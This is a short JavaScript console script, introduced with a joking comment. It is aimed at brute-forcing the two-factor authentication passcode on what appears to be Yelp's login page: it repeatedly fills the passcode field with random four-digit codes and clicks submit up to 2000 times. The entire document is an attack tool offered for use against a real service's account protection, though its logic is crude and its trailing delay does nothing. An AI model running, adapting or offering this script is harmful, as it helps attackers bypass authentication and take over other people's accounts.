// LOL a script to paste into the Console, used for brute-forcing the 2FA passcode.

function bf_yelp_2fa() {

  let max_attempts = 2000;
  let count = 0;

  do  {

    document.getElementsByClassName('passcode-form-input__09f24__UAiud').passcode.value = Math.floor(1000 + Math.random() * 9000);
    document.getElementsByTagName('button')[2].click()

    if (count < max_attempts) { count++; continue; }

  } while (count < max_attempts);

  var time_out = 1500;
  setTimeout(function() { return; }, time_out);

}
bf_yelp_2fa()
